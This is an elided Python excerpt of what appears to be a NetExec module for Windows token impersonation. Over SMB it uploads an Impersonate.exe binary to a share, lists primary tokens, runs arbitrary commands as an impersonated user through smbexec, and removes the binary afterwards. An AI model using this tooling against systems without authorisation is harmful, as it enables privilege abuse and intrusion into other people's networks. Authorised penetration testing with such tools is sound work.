...
class NXCModule:
    ...
    def options(self, context, module_options):
        ...
        with open(
            path.join(DATA_PATH, ("impersonate_module/impersonate.bs64"))
        ) as impersonate_file:
    ...
    def on_admin_login(self, context, connection):
        if self.useembeded:
            ...
            try:
                ...
                context.log.fail(
                    f"Impersonate file specified '{file_to_upload}' does not exist!"
                )
                sys.exit(1)
        else:
        ...
        with open(file_to_upload, "rb") as impersonate:
            try:
                connection.conn.putFile(
                    self.share, f"{self.tmp_share}{self.impersonate}", impersonate.read
                )
        ...
        try:
            if self.cmd == "" or self.token == "":
                ...
                for line in p.splitlines():
                    ...
                    context.log.highlight(
                        f"Primary token ID: {token:<2} {token_integrity:<6} {token_owner}"
                    )
            else:
                impersonated_user = ""
                p = self.list_available_primary_tokens(context, connection)
                ...
                if impersonated_user:
                    ...
                    command = (
                        f'{self.tmp_dir}Impersonate.exe exec {self.token} "{self.cmd}"'
                    )
                    for line in connection.execute(
                        command, True, methods=["smbexec"]
                    ).splitlines():
            ...
            try:
                connection.conn.deleteFile(
                    self.share, f"{self.tmp_share}{self.impersonate}"
                )
